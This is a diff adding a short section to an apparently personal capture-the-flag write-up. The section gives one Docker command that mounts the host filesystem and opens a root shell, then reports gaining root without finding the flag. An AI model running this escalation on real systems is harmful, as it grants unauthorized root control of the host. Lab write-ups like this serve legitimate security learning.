@@ -92,3 +92,18 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 
 ## So it's time to get privilege escalation escalation
+
+Docker
+```
+docker run -v /:/mnt --rm -it cb1b741122e8 chroot /mnt sh
+```
+
+![[Pasted image 20240818160415.png]]
+
+We got the root access
+```
+
+```
+
+I was not able to find the root flag so we have repository name with ubuntu 18.04
+
